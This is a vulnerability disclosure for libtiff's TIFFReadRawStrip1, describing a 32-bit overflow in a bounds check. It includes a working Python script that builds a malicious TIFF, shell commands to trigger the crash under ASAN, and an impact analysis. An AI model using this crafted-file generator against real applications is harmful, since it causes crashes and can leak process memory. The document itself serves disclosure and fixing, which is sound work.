## Bug0: TIFFReadRawStrip1 mmap bounds-check uint32 overflow leads to out-of-bounds read

In `TIFFReadRawStrip1()` in `libtiff/tif_read.c` (lines 197–209), the mmap bounds check adds `td_stripoffset[strip]` (uint32) and `size` (int32) in 32-bit unsigned arithmetic without overflow protection, allowing a crafted TIFF with `StripOffset=0xFFFFFF00` and `StripByteCount=256` to wrap the sum to zero, bypass the guard, and trigger an out-of-bounds read via `_TIFFmemcpy` far beyond the memory-mapped file region.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import sys

SHORT    = 3
LONG     = 4
RATIONAL = 5

def ifd_entry(tag, typ, count, value):
    return struct.pack('<HHII', tag, typ, count, value)

def create_vuln_tiff(output_path):
    ifd_offset   = 8
    num_entries  = 11
    ifd_end      = ifd_offset + 2 + num_entries * 12 + 4   # = 146
    xres_offset  = ifd_end
    yres_offset  = xres_offset + 8

    STRIP_OFFSET     = 0xFFFFFF00
    STRIP_BYTECOUNT  = 256

    entries = [
        ifd_entry(0x0100, SHORT,    1, 4),
        ifd_entry(0x0101, SHORT,    1, 4),
        ifd_entry(0x0102, SHORT,    1, 8),
        ifd_entry(0x0103, SHORT,    1, 1),
        ifd_entry(0x0106, SHORT,    1, 1),
        ifd_entry(0x0111, LONG,     1, STRIP_OFFSET),
        ifd_entry(0x0115, SHORT,    1, 1),
        ifd_entry(0x0116, SHORT,    1, 4),
        ifd_entry(0x0117, LONG,     1, STRIP_BYTECOUNT),
        ifd_entry(0x011A, RATIONAL, 1, xres_offset),
        ifd_entry(0x011B, RATIONAL, 1, yres_offset),
    ]

    header    = struct.pack('<HHI', 0x4949, 42, ifd_offset)
    ifd_block = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
    xres_data = struct.pack('<II', 72, 1)
    yres_data = struct.pack('<II', 72, 1)

    tiff_bytes = header + ifd_block + xres_data + yres_data

    with open(output_path, 'wb') as f:
        f.write(tiff_bytes)

    file_size    = len(tiff_bytes)
    overflow_sum = (STRIP_OFFSET + STRIP_BYTECOUNT) & 0xFFFFFFFF
    print(f"[+] Created: {output_path}  ({file_size} bytes)")
    print(f"[+] StripOffsets[0]    = 0x{STRIP_OFFSET:08X}")
    print(f"[+] StripByteCounts[0] = {STRIP_BYTECOUNT}")
    print(f"[+] uint32 overflow:   0x{STRIP_OFFSET:08X} + {STRIP_BYTECOUNT} = 0x{overflow_sum:08X} (wraps to {overflow_sum})")
    print(f"[+] Bounds check:      '{overflow_sum} > {file_size}' = False => bypassed!")

if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'poc_input.tif'
    create_vuln_tiff(out)
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: SEGV on unknown address 0x7f2ec53d8f00 (pc 0x7f2dc89f7881 bp 0x7ffd86e90cf0 sp 0x7ffd86e90cb8 T0). The signal is caused by a READ memory access. #0 0x7f2dc89f7881 in memcpy (/lib/x86_64-linux-gnu/libc.so.6+0xc4881). #1 0x7f2dc90ef225 in _TIFFmemcpy (libtiff.so.3+0x3fc225).

### Impact

An attacker who supplies a crafted TIFF file can cause `tiffsplit` (or any application that calls `TIFFReadRawStrip`) to perform an out-of-bounds read via `_TIFFmemcpy` from an address approximately 4 GiB beyond the memory-mapped file region, reliably producing a SIGSEGV crash and denial of service. If the out-of-bounds address happens to fall within another mapped region (such as a shared library or heap), the read can copy sensitive process memory into the caller's buffer, resulting in information disclosure. On 32-bit targets, the address wrap-around can additionally cause the memcpy to read from an attacker-influenced in-process location, potentially escalating the impact to exploitable heap corruption.
